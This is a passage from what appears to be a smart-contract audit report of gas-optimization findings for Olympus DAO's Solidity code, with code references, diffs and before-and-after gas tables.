┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                            ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -440,7 +440,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                                    ┆ 24144           ┆ 24144  ┆ 24144  ┆ 24144  ┆ 5       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ initialize                                               ┆ 10107           ┆ 491657 ┆ 524236 ┆ 895872 ┆ 7       │ +│ initialize                                               ┆ 8371            ┆ 486274 ┆ 519133 ┆ 885906 ┆ 7       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                                 ┆ 317             ┆ 317    ┆ 317    ┆ 317    ┆ 5       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -453,7 +453,7 @@  ╞═══════════════════════════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡  │ Deployment Cost                                               ┆ Deployment Size ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 739696                                                        ┆ 3762            ┆       ┆        ┆       ┆         │ +│ 719277                                                        ┆ 3660            ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                                 ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -469,7 +469,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ requestPermissions                                            ┆ 2061            ┆ 2477  ┆ 2061   ┆ 4561  ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ revokePolicyApprovals                                         ┆ 6956            ┆ 6956  ┆ 6956   ┆ 6956  ┆ 1       │ +│ revokePolicyApprovals                                         ┆ 6842            ┆ 6842  ┆ 6842   ┆ 6842  ┆ 1       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setActiveStatus                                               ┆ 733             ┆ 733   ┆ 733    ┆ 733   ┆ 6       │  ╰───────────────────────────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ```     ### [G&#x2011;06]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 4 instances of this issue:* ```solidity File: src/policies/Operator.sol  206:          Config memory config_ = _config;  385:              Config memory config_ = _config;  440:              Config memory config_ = _config;  666:          Regen memory regen = _status.low;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L206  ```diff diff --git a/src/policies/Operator.sol b/src/policies/Operator.sol index 7573526..e3c5c53 100644 --- a/src/policies/Operator.sol +++ b/src/policies/Operator.sol @@ -203,7 +203,7 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          _updateCapacity(false, 0);            /// Cache config in memory -        Config memory config_ = _config; +        Config storage config_ = _config;            /// Check if walls can regenerate capacity          if ( @@ -437,7 +437,7 @@ contract Operator is IOperator, Policy, ReentrancyGuard {              uint256 minimumPrice = invCushionPrice.mulDiv(bondScale, oracleScale);                /// Cache config struct to avoid multiple SLOADs -            Config memory config_ = _config; +            Config storage config_ = _config;                /// Calculate market capacity from the cushion factor              uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE); @@ -663,7 +663,7 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          /// Update low side regen status with a new observation          /// Observation is positive if the current price is greater than the MA          uint32 observe = _config.regenObserve; -        Regen memory regen = _status.low; +        Regen storage regen = _status.low;          if (currentPrice >= movingAverage) {              if (!regen.observations[regen.nextObservation]) {                  _status.low.observations[regen.nextObservation] = true; ```  ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..0d24e75 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -371,7 +371,7 @@  ╞═════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                             ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 4679925                                     ┆ 25703           ┆        ┆        ┆        ┆         │ +│ 4594613                                     ┆ 25277           ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                               ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -397,7 +397,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                    ┆ 439             ┆ 439    ┆ 439    ┆ 439    ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ operate                                     ┆ 387             ┆ 122263 ┆ 37958  ┆ 640609 ┆ 104     │ +│ operate                                     ┆ 387             ┆ 118525 ┆ 34414  ┆ 636359 ┆ 104     │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ regenerate                                  ┆ 3772            ┆ 17622  ┆ 21791  ┆ 29292  ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ ```  ### [G&#x2011;07]  State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 7 instances of this issue:* ```solidity File: src/modules/PRICE.sol  /// @audit _movingAverage on line 138 146:          emit NewObservation(block.timestamp, currentPrice, _movingAverage);  /// @audit nextObsIndex on line 185 185:          uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  /// @audit numObservations on line 97 100:          observations = new uint256[](numObservations);  /// @audit observationFrequency on line 165 171:              if (updatedAt < block.timestamp - uint256(observationFrequency))  /// @audit observationFrequency on line 242 246:          uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);  /// @audit movingAverageDuration on line 268 272:          uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L146  ```solidity File: src/policies/Heart.sol  /// @audit reward on line 112 113:          emit RewardIssued(to_, reward);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L113  ### [G&#x2011;08]  Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata  *There is 1 instance of this issue:* ```solidity File: src/Kernel.sol  /// @audit moduleDependents[keycode] on line 309 310:              getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L310  ### [G&#x2011;09]  The result of function calls should be cached rather than re-calling the function The instances below point to the second+ call of the function within a single function  *There are 3 instances of this issue:* ```solidity File: src/policies/PriceConfig.sol  /// @audit PRICE.KEYCODE() on line 32 33:           permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);  /// @audit PRICE.KEYCODE() on line 32 34:           permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L33  ```solidity File: src/policies/VoterRegistration.sol  /// @audit VOTES.KEYCODE() on line 34 35:           permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L35  ### [G&#x2011;10]  `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**  *There are 3 instances of this issue:* ```solidity File: src/modules/PRICE.sol  136:              _movingAverage += (currentPrice - earliestPrice) / numObs;  138:              _movingAverage -= (earliestPrice - currentPrice) / numObs;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L136  ```solidity File: src/policies/Heart.sol  103:          lastBeat += frequency();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L103  ### [G&#x2011;11]  `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 9 instances of this issue:* ```solidity File: src/Kernel.sol  266:      function _installModule(Module newModule_) internal {  279:      function _upgradeModule(Module newModule_) internal {  295:      function _activatePolicy(Policy policy_) internal {  325:      function _deactivatePolicy(Policy policy_) internal {  351:      function _migrateKernel(Kernel newKernel_) internal {  378:      function _reconfigurePolicies(Keycode keycode_) internal {  409:      function _pruneFromDependents(Policy policy_) internal {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L266  ```solidity File: src/policies/Heart.sol  111:      function _issueReward(address to_) internal {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111  ```solidity File: src/policies/Operator.sol  652       function _addObservation() internal { 653           /// Get latest moving average from the price module 654:          uint256 movingAverage = PRICE.getMovingAverage();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L652-L654  ### [G&#x2011;12]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There is 1 instance of this issue:* ```solidity File: src/modules/PRICE.sol  /// @audit if-condition on line 135 136:              _movingAverage += (currentPrice - earliestPrice) / numObs;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L136  ### [G&#x2011;13]  `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There is 1 instance of this issue:* ```solidity File: src/policies/Governance.sol  278:          for (uint256 step; step < instructions.length; ) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278  ### [G&#x2011;14]  Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 20 instances of this issue:* ```solidity File: src/interfaces/IBondCallback.sol  /// @audit callback(), amountsForMarket(), whitelist() 6:    interface IBondCallback {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/interfaces/IBondCallback.sol#L6  ```solidity File: src/Kernel.sol  /// @audit changeKernel() 62:   abstract contract KernelAdapter {  /// @audit KEYCODE(), VERSION(), INIT() 84:   abstract contract Module is KernelAdapter {  /// @audit setActiveStatus(), configureDependencies(), requestPermissions() 111:  abstract contract Policy is KernelAdapter {  /// @audit executeAction(), grantRole(), revokeRole() 149:  contract Kernel {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L62  ```solidity File: src/modules/INSTR.sol  /// @audit getInstructions(), store() 10:   contract OlympusInstructions is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L10  ```solidity File: src/modules/MINTR.sol  /// @audit mintOhm(), burnOhm() 8:    contract OlympusMinter is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L8  ```solidity File: src/modules/PRICE.sol  /// @audit updateMovingAverage(), getCurrentPrice(), getLastPrice(), getMovingAverage(), initialize(), changeMovingAverageDuration(), changeObservationFrequency() 22:   contract OlympusPrice is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L22  ```solidity File: src/modules/RANGE.sol  /// @audit updateCapacity(), updatePrices(), regenerate(), updateMarket(), setSpreads(), setThresholdFactor(), range(), capacity(), active(), price(), spread(), market(), lastActive() 16:   contract OlympusRange is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L16  ```solidity File: src/modules/TRSRY.sol  /// @audit getReserveBalance(), setApprovalFor(), withdrawReserves(), getLoan(), repayLoan(), setDebt() 17:   contract OlympusTreasury is Module, ReentrancyGuard {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L17  ```solidity File: src/modules/VOTES.sol  /// @audit mintTo(), burnFrom() 11:   contract OlympusVotes is Module, ERC20 {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L11  ```solidity File: src/policies/BondCallback.sol  /// @audit batchToTreasury(), setOperator() 17:   contract BondCallback is Policy, ReentrancyGuard, IBondCallback {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L17  ```solidity File: src/policies/Governance.sol  /// @audit getMetadata(), getActiveProposal(), submitProposal(), endorseProposal(), activateProposal(), vote(), executeProposal(), reclaimVotes() 51:   contract OlympusGovernance is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L51  ```solidity File: src/policies/Heart.sol  /// @audit beat(), frequency(), resetBeat(), toggleBeat(), setRewardTokenAndAmount(), withdrawUnspentRewards() 21:   contract OlympusHeart is IHeart, Policy, ReentrancyGuard {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L21  ```solidity File: src/policies/interfaces/IHeart.sol  /// @audit beat(), frequency(), resetBeat(), toggleBeat(), setRewardTokenAndAmount(), withdrawUnspentRewards() 6:    interface IHeart {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IHeart.sol#L6  ```solidity File: src/policies/interfaces/IOperator.sol  /// @audit operate(), swap(), getAmountOut(), setSpreads(), setThresholdFactor(), setCushionFactor(), setCushionParams(), setReserveFactor(), setRegenParams(), setBondContracts(), initialize(), regenerate(), toggleActive(), fullCapacity(), status(), config() 8:    interface IOperator {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IOperator.sol#L8  ```solidity File: src/policies/Operator.sol  /// @audit bondPurchase(), setSpreads(), setThresholdFactor(), setCushionFactor(), setCushionParams(), setReserveFactor(), setRegenParams(), setBondContracts(), initialize(), regenerate(), toggleActive(), getAmountOut() 30:   contract Operator is IOperator, Policy, ReentrancyGuard {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L30  ```solidity File: src/policies/PriceConfig.sol  /// @audit initialize(), changeMovingAverageDuration(), changeObservationFrequency() 7:    contract OlympusPriceConfig is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L7  ```solidity File: src/policies/TreasuryCustodian.sol  /// @audit grantApproval(), revokePolicyApprovals(), increaseDebt(), decreaseDebt() 15:   contract TreasuryCustodian is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L15  ```solidity File: src/policies/VoterRegistration.sol  /// @audit issueVotesTo(), revokeVotesFrom() 9:    contract VoterRegistration is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L9  ### [G&#x2011;15]  Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past  *There are 11 instances of this issue:* ```solidity File: src/Kernel.sol  113:      bool public isActive;  181:      mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;  194:      mapping(address => mapping(Role => bool)) public hasRole;  197:      mapping(Role => bool) public isRole;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L113  ```solidity File: src/modules/PRICE.sol  62:       bool public initialized;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L62  ```solidity File: src/policies/BondCallback.sol  24:       mapping(address => mapping(uint256 => bool)) public approvedMarkets;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L24  ```solidity File: src/policies/Governance.sol  105:      mapping(uint256 => bool) public proposalHasBeenActivated;  117:      mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L105  ```solidity File: src/policies/Heart.sol  33:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L33  ```solidity File: src/policies/Operator.sol  63:       bool public initialized;  66:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63  ### [G&#x2011;16]  Use a more recent version of solidity Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  *There are 3 instances of this issue:* ```solidity File: src/interfaces/IBondCallback.sol  2:    pragma solidity >=0.8.0;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/interfaces/IBondCallback.sol#L2  ```solidity File: src/policies/interfaces/IHeart.sol  2:    pragma solidity >=0.8.0;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IHeart.sol#L2  ```solidity File: src/policies/interfaces/IOperator.sol  2:    pragma solidity >=0.8.0;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IOperator.sol#L2  ### [G&#x2011;17]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) Saves **5 gas per loop**  *There are 7 instances of this issue:* ```solidity File: src/policies/Operator.sol  488:              decimals++;  670:                  _status.low.count++;  675:                  _status.low.count--;  686:                  _status.high.count++;  691:                  _status.high.count--;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488  ```solidity File: src/utils/KernelUtils.sol  49:               i++;  64:               i++;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L49  ### [G&#x2011;18]  Using `private` rather than `public` for constants, saves gas If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table  *There are 11 instances of this issue:* ```solidity File: src/modules/PRICE.sol  59:       uint8 public constant decimals = 18;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L59  ```solidity File: src/modules/RANGE.sol  65:       uint256 